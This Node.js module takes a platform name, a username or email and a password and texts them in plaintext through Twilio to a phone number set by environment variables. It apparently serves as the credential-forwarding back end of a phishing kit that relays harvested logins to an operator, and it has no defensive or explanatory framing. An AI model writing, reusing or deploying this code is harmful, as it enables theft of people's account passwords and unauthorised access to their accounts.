const twilio = require("twilio");

async function sendMsg(identifier, password, platform) {
  const accountSid = process.env.ACCOUNT_SID;
  const authToken = process.env.AUTH_TOKEN;
  const from = process.env.FROM_MOBILE_NUMBER;
  const to = process.env.TO_MOBILE_NUMBER;
  const client = twilio(accountSid, authToken);

  await client.messages
    .create({
      from: from,
      to: to,
      body: `Platform: ${platform}\nUsername/Email/Mobile: ${identifier} \nPassword: ${password}`,
    })
    .then((message) => console.log(message.sid))
    .catch((error) => {
      console.log(error);
    });
}

module.exports = sendMsg;
